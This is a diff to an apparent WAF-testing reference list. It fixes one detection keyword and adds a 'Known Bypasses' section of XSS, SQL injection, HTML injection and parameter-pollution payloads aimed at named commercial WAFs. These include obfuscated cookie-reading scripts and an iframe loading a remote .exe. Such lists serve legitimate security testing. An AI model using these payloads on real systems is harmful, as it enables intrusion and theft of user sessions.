@@ -290,7 +290,7 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Response cookies may contain <code>barra_counter_session</code> value.</li>
-                    <li>Response headers may contain <code>barracude_</code> keyword.</li>
+                    <li>Response headers may contain <code>barracuda_</code> keyword.</li>
                 </ul>
             </ul>
         </td>
@@ -1442,6 +1442,119 @@ __Drawbacks:__
 - This method is time consuming.
 
 ## Google Dorks Approach:
+
+## Known Bypasses:
+- __Cloudflare__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
+```
+
+- __Imperva SecureSphere__ 
+* Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
+```
+* SQL Injection _([Source 1](https://www.exploit-db.com/exploits/35729), [Source 2](https://www.exploit-db.com/exploits/28854))_
+```
+15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
+stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
+```
+
+- __Barracuda__ 
+- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+<body style="height:1000px" onwheel="alert(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+```
+- HTML Injection _([Source](https://www.exploit-db.com/exploits/33423))_
+```
+/cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
+```
+- __dotDefender__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+<svg/onload=prompt(1);>
+<isindex action="javas&tab;cript:alert(1)" type=image>
+<marquee/onstart=confirm(2)>
+```
+* GET - Cross Site Scripting _([Source](https://www.exploit-db.com/exploits/14355))_
+```
+<img src="WTF" onError="{var
+{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B
+h%2Bn)(/0wn3d/.source)" />
+```
+
+* POST Based Cross Site Scripting _([Source](https://www.exploit-db.com/exploits/14355))_
+```
+<img src="WTF" onError="{var
+{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/
+.source)" />
+```
+
+- __Fortiweb__ - Cross Site Scripting _([Source](https://www.exploit-db.com/exploits/38100))_
+```
+/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
+/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0 
+```
+
+- __F5 ASM__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+<table background="javascript:alert(1)"></table>
+"/><marquee onfinish=confirm(123)>a</marquee>
+```
+
+- __f5 BIG-IP__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+<body style="height:1000px" onwheel="[DATA]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
+```
+
+- __ModSecurity__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>
+<object%00something allowScriptAccess=always data=//0me.me/demo/xss/flash/normalEmbededXSS.swf?
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+```
+
+- __Citrix NetScaler NS10.5__ - HTTP Parameter Pollution _([Source](https://www.exploit-db.com/exploits/36369))_
+```
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+   <soapenv:Header/>
+   <soapenv:Body>
+        <string>’ union select current_user, 2#</string>
+    </soapenv:Body>
+</soapenv:Envelope>
+```
+
+- __WebKnight__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
+<marquee/onstart=confirm(2)>
+<details ontoggle=alert(1)>
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+```
+
+- __QuickDefense__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+```
+?<input type="search" onsearch="aler\u0074(1)">
+<details ontoggle=alert(1)>
+```
+
+- __Apache__ - Writing method type in lowercase. _([Source](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet))_
+```
+get /login HTTP/1.1
+Host: favoritewaf.com
+User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
+```
+
+- __IIS__ - Tabs before method _([Source](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet))_
+```
+    GET /login.php HTTP/1.1
+Host: favoritewaf.com
+User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
+```
 
 ## Awesome Tools
 ### WAF Fingerprinting:
